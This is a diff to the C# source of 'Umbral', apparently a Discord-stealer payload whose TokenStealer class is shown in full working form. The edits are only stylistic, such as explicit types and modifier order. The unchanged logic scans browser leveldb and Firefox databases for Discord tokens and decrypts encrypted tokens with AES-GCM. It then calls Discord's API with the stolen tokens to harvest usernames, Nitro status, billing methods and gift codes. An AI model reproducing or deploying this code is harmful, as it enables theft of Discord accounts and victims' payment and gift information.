@@ -14,13 +14,13 @@ namespace Umbral.payload.Discord
 {
     internal class TokenStealer
     {
-        private static readonly string RoamingPath;
+        static private readonly string RoamingPath;
 
-        private static readonly string LocalAppDataPath;
+        static private readonly string LocalAppDataPath;
 
-        private static readonly HttpClient Client;
+        static private readonly HttpClient Client;
 
-        private static List<DiscordAccountFormat> _accounts;
+        static private List<DiscordAccountFormat> _accounts;
 
         static TokenStealer()
         {
@@ -43,7 +43,7 @@ namespace Umbral.payload.Discord
             return _accounts.ToArray();
         }
 
-        private static async Task Run()
+        static private async Task Run()
         {
             _accounts.Clear();
             var processes = new List<Task>();
@@ -92,32 +92,32 @@ namespace Umbral.payload.Discord
             RemoveDuplicates();
         }
 
-        private static async Task MethodA(string path)
+        static private async Task MethodA(string path)
         {
             string[] allowedExtentions = { ".log", ".ldb" };
-            var regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", RegexOptions.Compiled);
+            Regex regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", RegexOptions.Compiled);
 
             var processes = new List<Task>();
             var obtainedTokens = new List<string>();
 
-            var leveldbDirs = await Task.Run(() =>
+            string[] leveldbDirs = await Task.Run(() =>
                 Directory.GetDirectories(path, "leveldb", SearchOption.AllDirectories));
 
-            foreach (var dir in leveldbDirs)
+            foreach (string dir in leveldbDirs)
             {
-                var files = Directory.GetFiles(dir, "*", SearchOption.TopDirectoryOnly)
+                string[] files = Directory.GetFiles(dir, "*", SearchOption.TopDirectoryOnly)
                     .Where(file => allowedExtentions.Contains(Path.GetExtension(file)))
                     .ToArray();
 
-                foreach (var file in files)
+                foreach (string file in files)
                     try
                     {
                         string content;
 
-                        using (var fs = new FileStream(file, FileMode.Open, FileAccess.Read,
+                        using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read,
                                    FileShare.ReadWrite))
                         {
-                            using (var reader = new StreamReader(fs))
+                            using (StreamReader reader = new StreamReader(fs))
                             {
                                 content = await reader.ReadToEndAsync();
                             }
@@ -125,11 +125,11 @@ namespace Umbral.payload.Discord
 
                         if (!string.IsNullOrWhiteSpace(content))
                         {
-                            var matches = regex.Matches(content);
+                            MatchCollection matches = regex.Matches(content);
 
                             foreach (Match match in matches)
                             {
-                                var token = match.Value;
+                                string token = match.Value;
 
                                 if (!obtainedTokens.Contains(token))
                                 {
@@ -148,26 +148,26 @@ namespace Umbral.payload.Discord
             await Task.WhenAll(processes);
         }
 
-        private static async Task MethodB(string path)
+        static private async Task MethodB(string path)
         {
             string[] allowedExtentions = { ".log", ".ldb" };
-            var regex = new Regex(@"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*", RegexOptions.Compiled);
+            Regex regex = new Regex(@"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*", RegexOptions.Compiled);
 
             var processes = new List<Task>();
             var obtainedTokens = new List<string>();
 
-            var localStatePath = Path.Combine(path, "Local State");
-            var levelDbPath = Path.Combine(path, "Local Storage", "leveldb");
+            string localStatePath = Path.Combine(path, "Local State");
+            string levelDbPath = Path.Combine(path, "Local Storage", "leveldb");
 
             if (File.Exists(localStatePath) && Directory.Exists(levelDbPath))
                 try
                 {
                     string content;
 
-                    using (var fs = new FileStream(localStatePath, FileMode.Open, FileAccess.Read,
+                    using (FileStream fs = new FileStream(localStatePath, FileMode.Open, FileAccess.Read,
                                FileShare.ReadWrite))
                     {
-                        using (var reader = new StreamReader(fs))
+                        using (StreamReader reader = new StreamReader(fs))
                         {
                             content = await reader.ReadToEndAsync();
                         }
@@ -195,13 +195,13 @@ namespace Umbral.payload.Discord
 
                         if (!string.IsNullOrWhiteSpace(content))
                         {
-                            var matches = regex.Matches(content);
+                            MatchCollection matches = regex.Matches(content);
                             foreach (Match match in matches)
                             {
-                                var token = match.Value;
+                                string token = match.Value;
                                 if (token.EndsWith("\\")) token = token.Take(token.Length - 1).ToString();
 
-                                var buffer = Convert.FromBase64String(token.Split(new[] { "dQw4w9WgXcQ:" },
+                                byte[] buffer = Convert.FromBase64String(token.Split(new[] { "dQw4w9WgXcQ:" },
                                     StringSplitOptions.None)[1]);
 
                                 token = DecryptTokenMethodB(buffer, key);
@@ -223,23 +223,23 @@ namespace Umbral.payload.Discord
             await Task.WhenAll(processes);
         }
 
-        private static async Task FireFoxMethod(string path)
+        static private async Task FireFoxMethod(string path)
         {
             var processes = new List<Task>();
             var obtainedTokens = new List<string>();
-            var regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", RegexOptions.Compiled);
+            Regex regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", RegexOptions.Compiled);
 
-            var files = await Task.Run(() => Directory.GetFiles(path, "*.sqlite", SearchOption.AllDirectories));
+            string[] files = await Task.Run(() => Directory.GetFiles(path, "*.sqlite", SearchOption.AllDirectories));
 
-            foreach (var file in files)
+            foreach (string file in files)
                 try
                 {
                     string content;
 
-                    using (var fs = new FileStream(file, FileMode.Open, FileAccess.Read,
+                    using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read,
                                FileShare.ReadWrite))
                     {
-                        using (var reader = new StreamReader(fs))
+                        using (StreamReader reader = new StreamReader(fs))
                         {
                             content = await reader.ReadToEndAsync();
                         }
@@ -247,11 +247,11 @@ namespace Umbral.payload.Discord
 
                     if (!string.IsNullOrWhiteSpace(content))
                     {
-                        var matches = regex.Matches(content);
+                        MatchCollection matches = regex.Matches(content);
 
                         foreach (Match match in matches)
                         {
-                            var token = match.Value;
+                            string token = match.Value;
                             if (!obtainedTokens.Contains(token) && !string.IsNullOrWhiteSpace(token))
                             {
                                 processes.Add(AddAccount(token));
@@ -268,7 +268,7 @@ namespace Umbral.payload.Discord
             await Task.WhenAll(processes);
         }
 
-        private static string DecryptTokenMethodB(byte[] buffer, byte[] protectedKey)
+        static private string DecryptTokenMethodB(byte[] buffer, byte[] protectedKey)
         {
             try
             {
@@ -277,7 +277,7 @@ namespace Umbral.payload.Discord
                 byte[] iv = buffer.Skip(3).Take(12).ToArray();
 
                 byte[] tag = cipherText.Skip(cipherText.Length - 16).ToArray();
-                
+
                 cipherText = cipherText.Take(cipherText.Length - tag.Length).ToArray();
 
                 byte[] token = new AesGcm().Decrypt(key, iv, null, cipherText, tag);
@@ -291,22 +291,22 @@ namespace Umbral.payload.Discord
             }
         }
 
-        private static async Task<string[]> GetBilling(string token)
+        static private async Task<string[]> GetBilling(string token)
         {
             var billingMethods = new List<string>();
 
-            using (var request = new HttpRequestMessage(HttpMethod.Get,
+            using (HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get,
                        "https://discordapp.com/api/v9/users/@me/billing/payment-sources"))
             {
                 request.Headers.Authorization = AuthenticationHeaderValue.Parse(token);
 
                 try
                 {
-                    var response = await Client.SendAsync(request);
+                    HttpResponseMessage response = await Client.SendAsync(request);
 
                     if (response.IsSuccessStatusCode)
                     {
-                        var content = await response.Content.ReadAsStringAsync();
+                        string content = await response.Content.ReadAsStringAsync();
 
                         var billingResponseJson =
                             SimpleJson.DeserializeObject<List<dynamic>>(content);
@@ -323,7 +323,7 @@ namespace Umbral.payload.Discord
                                 {
                                     { 0, "(Unknown)" },
                                     { 1, "Card" }
-                                }.TryGetValue(block.type, out var billingType))
+                                }.TryGetValue(block.type, out string billingType))
                                 billingType = "Paypal";
 
                             billingMethods.Add(billingType);
@@ -339,20 +339,20 @@ namespace Umbral.payload.Discord
             return billingMethods.ToArray();
         }
 
-        private static async Task<GiftFormat[]> GetGifts(string token)
+        static private async Task<GiftFormat[]> GetGifts(string token)
         {
             var gifts = new List<GiftFormat>();
 
-            using (var request = new HttpRequestMessage(HttpMethod.Get,
+            using (HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get,
                        "https://discord.com/api/v10/users/@me/outbound-promotions/codes"))
             {
                 request.Headers.Authorization = AuthenticationHeaderValue.Parse(token);
 
                 try
                 {
-                    var response = await Client.SendAsync(request);
+                    HttpResponseMessage response = await Client.SendAsync(request);
 
-                    var content = await response.Content.ReadAsStringAsync();
+                    string content = await response.Content.ReadAsStringAsync();
 
                     if (content.Contains("code"))
                     {
@@ -361,7 +361,7 @@ namespace Umbral.payload.Discord
 
                         foreach (dynamic obj in giftResponseJson)
                         {
-                            var gift = new GiftResponseJsonFormat
+                            GiftResponseJsonFormat gift = new GiftResponseJsonFormat
                             {
                                 code = (string)obj["code"],
                                 promotion = new Promotion
@@ -370,8 +370,8 @@ namespace Umbral.payload.Discord
                                 }
                             };
 
-                            var code = gift.code;
-                            var title = gift.promotion.outbound_title;
+                            string code = gift.code;
+                            string title = gift.promotion.outbound_title;
 
                             if (!string.IsNullOrWhiteSpace(code) &&
                                 !string.IsNullOrWhiteSpace(title))
@@ -388,25 +388,25 @@ namespace Umbral.payload.Discord
             return gifts.ToArray();
         }
 
-        private static async Task AddAccount(string token)
+        static private async Task AddAccount(string token)
         {
-            using (var request =
+            using (HttpRequestMessage request =
                    new HttpRequestMessage(HttpMethod.Get, "https://discord.com/api/v10/users/@me"))
             {
                 request.Headers.Authorization = AuthenticationHeaderValue.Parse(token);
 
                 try
                 {
-                    var response = await Client.SendAsync(request);
+                    HttpResponseMessage response = await Client.SendAsync(request);
 
                     if (response.IsSuccessStatusCode)
                     {
-                        var content = await response.Content.ReadAsStringAsync();
+                        string content = await response.Content.ReadAsStringAsync();
 
                         dynamic jsonContent = SimpleJson.DeserializeObject(content);
 
-                        
-                        var tokenResponseJson = new TokenResponseJsonFormat
+
+                        TokenResponseJsonFormat tokenResponseJson = new TokenResponseJsonFormat
                         {
                             premium_type = (int)jsonContent["premium_type"],
                             username = (string)jsonContent["username"],
@@ -424,11 +424,11 @@ namespace Umbral.payload.Discord
                                 { 1, "Nitro Classic" },
                                 { 2, "Nitro" },
                                 { 3, "Nitro Basic" }
-                            }.TryGetValue(tokenResponseJson.premium_type, out var nitroType)
+                            }.TryGetValue(tokenResponseJson.premium_type, out string nitroType)
                            )
                             nitroType = "(Unknown)";
 
-                        var billing = await GetBilling(token);
+                        string[] billing = await GetBilling(token);
                         var gifts = await GetGifts(token);
 
                         _accounts.Add(new DiscordAccountFormat(
@@ -444,7 +444,7 @@ namespace Umbral.payload.Discord
             }
         }
 
-        private static void RemoveDuplicates()
+        static private void RemoveDuplicates()
         {
             _accounts = _accounts
                 .GroupBy(t => t.Token)
